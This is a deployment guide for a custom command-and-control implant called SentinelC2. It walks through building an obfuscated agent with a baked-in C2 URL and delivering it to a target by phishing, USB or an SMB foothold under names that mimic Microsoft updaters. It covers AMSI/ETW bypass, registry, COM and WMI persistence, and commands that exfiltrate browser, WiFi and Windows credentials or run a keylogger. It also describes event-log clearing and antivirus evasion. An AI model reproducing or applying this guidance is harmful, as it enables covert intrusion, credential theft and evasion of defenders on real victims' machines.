# DEPLOY.md — SentinelC2 End-to-End Deployment Guide

This guide walks through the full deployment pipeline: from a fresh
checkout to a single .exe you can drop on the target. Two flows:

- **DEPLOY.md** (this file) — full reference with explanations
- **QUICKDEPLOY.md** — 5-command minimum path, no explanations

The target deploy is a **single command** (one line on the target's
cmd.exe). The C2 URL and (optionally) the pinned TLS cert are baked
into the binary at build time, so the operator does NOT type the URL
on the target.

---

## Architecture (5-second summary)

```
[Operator's machine]                    [Target machine]
+------------------+                    +------------------+
| build_deploy.ps1 |                    |                  |
|  -> produces      |  --- single .exe->|  X:\agent.exe   |
|  agent_deployable|     copied over   |  (no args)       |
+------------------+                    +--------+---------+
                                                       |
                                                       v
                                              +--------+---------+
                                              | C2 server on     |
                                              | operator's VPS   |
                                              | (c2.example.com) |
                                              +------------------+
```

The agent on the target:
1. Connects to the baked-in C2 URL over `ws://`; use `wss://` only through an external TLS terminator
2. Performs the registration handshake (HMAC-authenticated)
3. Sets up the session crypto (AES-256-GCM)
4. Installs non-elevated persistence (Run key, COM hijack, Startup folder, ADS backup)
5. Waits for operator commands

---

## Step 0 — Prerequisites (one-time per operator machine)

You need:

- **Windows 10/11 or Server 2019+** as the build host (you're already on one)
- **Nim 2.2.10** at `D:\appdata\nim-2.2.10\bin\nim.exe`
  - If installed elsewhere: `setx NIM "C:\path\to\nim.exe"`
- **Nimble packages**: `nimcrypto`, `winim`, `ws`
  - Install: `nimble install nimcrypto winim ws`
- **MinGW gcc** for C codegen (part of nim's installer usually)
- **A VPS or public-facing server** to host the C2
  - The target's outbound traffic must reach it
  - Open TCP 8443 inbound
- **A domain name** pointing to the C2 server (e.g. `c2.yourdomain.com`)
  - The agent connects to `wss://c2.yourdomain.com:8443` — no IP literals
- **A TLS certificate** for that domain only when an external TLS terminator fronts the plain WebSocket listener
  - Let's Encrypt via acme.sh: `acme.sh --issue -d c2.yourdomain.com --standalone`
  - Or use a self-signed cert (works, but adds `untrusted CA` alerts in EDR)

Verify Nim is found:
```powershell
$env:NIM = "D:\appdata\nim-2.2.10\bin\nim.exe"
& $env:NIM --version
# Should print: Nim Compiler Version 2.2.10
```

---

## Step 1 — Set up the C2 server (one-time, on the VPS)

This guide assumes you already have a VPS reachable from the target.
For SentinelC2 the C2 server is `c2_server.nim` — a Nim program that
listens on TCP 8443 as plain WebSocket and serves the operator dashboard
on 8080. Put a reverse proxy/TLS terminator in front of 8443 for `wss://`.

### 1.1 — Install the C2 server build deps on the VPS

Same as the operator machine: Nim + nimble packages.

### 1.2 — Generate the TLS cert

If using acme.sh on the VPS:
```bash
acme.sh --issue -d c2.yourdomain.com --standalone
acme.sh --install-cert -d c2.yourdomain.com \
    --cert-file /etc/ssl/c2.crt \
    --key-file /etc/ssl/c2.key \
    --fullchain-file /etc/ssl/c2.fullchain.pem
```

Copy the **leaf cert** (`/etc/ssl/c2.crt`) and the **fullchain**
(`/etc/ssl/c2.fullchain.pem`) to the operator machine:
- The fullchain configures the external TLS terminator
- The leaf cert can be pinned in the Sentinel build

### 1.3 — Build and run the C2 server on the VPS

```powershell
# Build on the Windows operator machine
.\build.ps1

# Run it (foreground for first test)
$env:C2_WEB_USER = "operator"
$env:C2_WEB_PASSWORD = "YOUR_STRONG_PASSWORD"
.\build\c2_server.exe
```

The Nim server does not load `SSL_CERT` or `SSL_KEY`; terminate TLS in
the reverse proxy when the agent must use `wss://`.

For a deploy scenario, run it in a tmux/screen session or as a
systemd service. The C2 server logs every connection to stdout.

### 1.4 — Verify the C2 is reachable from outside

From a different machine (or your operator laptop):
```bash
curl -k http://c2.yourdomain.com:8080
# Should show the operator login page
```

---

## Step 2 — Build the deployable agent (one-time, on operator machine)

This is the **single command** that produces the .exe you drop on the
target.

### 2.1 — Get the agent secret

The agent and the C2 server share a secret used for the registration
handshake. It must match in both binaries.

Use a per-engagement passphrase. Set the same `C2_AGENT_PASSPHRASE`
before building the server and the agent. The build scripts generate
`secret.nim`; `build_sentinel.ps1 -Passphrase` affects only Sentinel,
not the server.

### 2.2 — Build the deployable

```powershell
cd D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim

# If you have a TLS cert to pin:
.\build_deploy.ps1 `
    -C2Url "wss://c2.yourdomain.com:8443" `
    -CertFile "C:\path\to\c2-leaf.pem" `
    -Variant "aggressive" `
    -OutputName "agent.exe"

# If you DON'T have a cert (system trust store, corp-MITM risk):
.\build_deploy.ps1 `
    -C2Url "wss://c2.yourdomain.com:8443" `
    -Variant "aggressive" `
    -OutputName "agent.exe"
```

The script:
1. Generates `c2_override.nim` with the C2 URL and cert
2. Generates a per-build XOR key for string obfuscation
3. Compiles the hardened agent with the URL baked in
4. Cleans up the temp files
5. Verifies the URL is in the binary
6. Output: `build\agent.exe` (~875 KB)

**Variants:**
- `silent` — no automatic persistence; operator triggers via `persist` command
- `engagement` — auto-persistence on first C2 connect (Run key + COM hijack + Startup + GPO)
- `aggressive` — engagement + ADS backup + WMI persistence attempt + auto-keylogger

**Recommendation: use `aggressive` for the actual target.** It installs
persistence immediately after C2 connect, which is the whole point.

### 2.3 — Test the build in a VM FIRST

Do not skip this. Build a Windows 10/11 VM with default Defender
settings. Copy `build\agent.exe` over and run it. Watch your C2
server — you should see the agent register within 5-10 seconds.

Things to verify in the VM test:
- [ ] C2 server shows the agent registered
- [ ] `whoami` command returns the target's user
- [ ] `recon edr` returns a process list
- [ ] `persist` command installs persistence (check Run key, Startup folder)
- [ ] After reboot, the agent reconnects automatically
- [ ] `panic` command removes persistence and the agent exits

If any of these fail, debug before touching a real target. The most
common failure modes:
- Defender quarantines the binary on disk → see Step 6 "AV evasion"
- The agent can't reach the C2 URL → check DNS, firewall, TLS cert
- The agent registers but persistence fails → check the C2 logs for
  the specific error code

---

## Step 3 — Deploy on the target (single command)

### 3.1 — Get the .exe onto the target

This guide does not cover the initial access vector — that's outside
the scope. Use whatever you have:
- USB stick (most reliable, no network egress)
- Phishing attachment (lure with a signed or legitimate-looking name)
- Web download from a CDN you control
- SMB share if you have a foothold

The .exe is ~875 KB and statically linked. Rename it to whatever
won't draw attention: `update.exe`, `OneDriveStandaloneUpdater.exe`,
`MicrosoftEdgeUpdate.exe`, etc. (The agent internally renames itself
to a similar name in the install path, but having a benign-looking
filename on disk is still a good first impression.)

### 3.2 — The single command

On the target's cmd.exe, Run dialog (`Win+R`), or any other exec
context:

```cmd
X:\path\agent.exe
```

That's it. No arguments. The agent:
1. Applies AMSI bypass + ETW suppression (in-process patches)
2. Performs anti-analysis checks (debugger, VM)
3. Connects to `wss://c2.yourdomain.com:8443`
4. Registers with your C2
5. Installs persistence (Run key + Startup + COM hijack + ADS backup)
6. Waits for commands

**If the target's user is not admin:**
- Run key ✅ (HKCU, no admin needed)
- Startup folder ✅ (no admin needed)
- COM hijack ✅ (HKCU, no admin needed)
- ADS backup ✅ (no admin needed)
- GPO script ⚠️ (HKCU works without admin but is less reliable)
- WMI persistence ❌ (needs admin for `%WINDIR%\System32\wbem\` write)

**If the target's user IS admin** (or you're running from an elevated
cmd.exe): all of the above, plus WMI event subscription.

If you need admin and the user is a standard user, you'll need a
UAC bypass before the agent runs. The agent itself does not include
a UAC bypass — handle that separately (Fodhelper, EventVwr, etc.).

### 3.3 — Verify the agent registered

Within 5-15 seconds, your C2 server (in the tmux/screen session on
the VPS) should log:
```
[+] Agent registered: <random_agent_id>
    Hostname: TARGET-PC
    User: domain\targetuser
    Variant: aggressive
```

Open the operator dashboard at `https://c2.yourdomain.com:8080` and
log in. You should see the agent in the active list.

### 3.4 — First commands to run

In the dashboard, issue these in order:
1. `whoami` — confirm the agent is on the right machine/user
2. `recon expanded` — full system info (installed software, services,
   network connections)
3. `persist` — install ALL persistence (idempotent, safe to re-run)
4. `recon edr` — process list (filter for AV/EDR on the operator side)

After `persist`, the agent will survive reboot.

---

## Step 4 — Operational commands

The full command set is documented in `README.md`. The essentials:

| Command | Description |
|---|---|
| `shell <cmd>` | Run a command. Direct .exe spawn when possible; falls back to `cmd.exe` for builtins. |
| `ps` | Process list |
| `recon expanded` | Full system recon (SW + services + net) |
| `recon edr` | Process list (operator filters for security products client-side) |
| `exfil browser_creds` | Stream Chrome/Edge Login Data + Local State |
| `exfil wifi` | Saved WiFi passwords |
| `exfil wincreds` | Windows credential manager |
| `keys start` / `keys stop` | Keylogger |
| `upload <path>` | Write a file to the target |
| `download <path>` | Stream a file from the target |
| `persist` | Install all persistence |
| `killdate <unix_ts>` | Set self-destruct date |
| `sleep <minutes>` | Override default beacon interval |
| `kill` | Stop the agent (no cleanup) |
| `panic` | Full forensic wipe: remove persistence, shred binary, zero memory, clear event logs |

---

## Step 5 — Panic (clean teardown)

If you're done with the engagement or burning the laptop:

```cmd
panic
```

The agent:
1. Calls `selfCleanup` — removes Run key, GPO script, COM hijack CLSID,
   Startup folder entry, deletes the meta blob
2. Overwrites the implant binary 3 times (random + zeros + random)
3. Shreds the on-disk meta file
4. Zeros its own process memory
5. Clears 6 event logs: Application, System, Security, Setup,
   PowerShell Operational, Defender Operational
6. Exits

The Windows event logs will show the "ClearEventLog" calls in the
Security audit (4624/4663 events) and the binary overwrite in
Sysmon's FileDelete event. A skilled forensic analyst can recover
the timeline; a casual IT admin looking at Event Viewer will see
empty logs and no agent file.

---

## Step 6 — AV evasion (if Defender quarantines the binary)

The HA sandbox scored the agent 0 malicious, but real Defender on
the target may quarantine it within 200ms of landing on disk. If
your VM test shows Defender catching it, you have options:

1. **Pack the binary** — UPX, Themida, MPRESS. This often defeats
   static sigs but behavioral detection (ETW, AMSI, registry writes)
   still fires. Combine with the AMSI/ETW patches already in the
   agent.
2. **Sleep + staged load** — have a tiny dropper that sleeps for 30
   minutes (Defender ATP's "first seen" grace period), then decrypts
   and runs the main binary. The dropper itself has minimal IOCs.
3. **Signed binary** — if you can get a code-signing cert (even a
   self-signed EV cert helps), Defender SmartScreen stops being
   a problem.
4. **Renamed + relocated** — copy the .exe to `C:\ProgramData\`
   under a legitimate-looking name, run from there.

The HA-verified state of the current build: IAT is clean (only
KERNEL32+USER32+msvcrt), no plaintext secrets, no signatured
literal strings. The remaining AV surface is:
- T1546.003 WMI persistence (MOF file write)
- T1562.001 AMSI/ETW patches (VirtualProtect + ret-stubs)
- T1070.001 Event log clearing on panic
- T1546.015 COM hijacking
- T1547 Boot/Logon autostart (Run key + Startup folder)

These are inherent to the features — you can't remove them without
removing the features.

---

## File reference

| File | Role |
|---|---|
| `build_deploy.ps1` | The one-command build script for the deployable |
| `build_hardened.ps1` | Builds the 3 hardened variants (for HA testing) |
| `build.ps1` | Builds the baseline agent + C2 server |
| `hardened/agent_hardened.nim` | The hardened agent source (gets `c2_override.nim` included at build time) |
| `c2_override.nim` | Generated by build_deploy.ps1, contains the C2 URL + cert. Cleaned up after build. |
| `c2_server.nim` | The C2 server + dashboard |
| `DEPLOY.md` | This file |
| `QUICKDEPLOY.md` | 5-command minimum path |

## Quick command reference

| Action | Command |
|---|---|
| Build the deployable | `.\build_deploy.ps1 -C2Url "wss://..." -CertFile "..." -Variant aggressive` |
| Build the C2 server | `.\build.ps1` |
| Run the C2 server (foreground) | `$env:C2_WEB_USER=...; $env:C2_WEB_PASSWORD=...; .\build\c2_server.exe` |
| Deploy on target (single command) | `X:\path\agent.exe` |
| Verify agent registered | `curl -k http://c2.yourdomain.com:8080` |
| Stop the agent + wipe | From C2: `panic` |

---

## Troubleshooting

**Build fails with "cannot open file: c2_override.nim"**
Run the build via `build_deploy.ps1` (which generates it) or create
a stub `c2_override.nim` at the project root with:
```nim
const C2_DEPLOY_URL* = "ws://127.0.0.1:8443"
const PINNED_CERT_DEPLOY_PEM* = ""
```

**Build fails with "undeclared identifier: X"**
You might be running an older version of the hardened module. Run
`git pull` or check that all 11 hardened modules are present in
`hardened/`.

**Agent runs but doesn't register on C2**
- Check the agent log at `%TEMP%\csp-<BuildPrefix>.dat` on the target
- Verify DNS resolves the C2 host from the target
- Check that TCP 8443 is open inbound on the C2 server's firewall
- Verify the C2 server is running and listening (look for "listening
  on 0.0.0.0:8443" in its log)
- Confirm the agent secret in the agent matches the C2 server's secret

**Agent registers but persistence fails**
The C2 logs the specific error. Common causes:
- EACCES on `%WINDIR%\System32\wbem\` (need admin for WMI)
- EACCES on `HKLM` registry (need admin for system-wide persistence)
- The Startup folder path doesn't exist on the target (rare on Win10+)

**Defender quarantines the binary on disk**
See Step 6. The HA "0 malicious" is a sandbox result, not a Defender
prediction. Test in a VM with default Defender first.

**Hybrid Analysis report still shows ~15 suspicious indicators**
That's the price of having WMI persistence, AMSI/ETW patches, COM
hijack, Run key, and event log clearing. The HA score measures
technique presence, not whether the binary will execute. The VM test
is the source of truth.
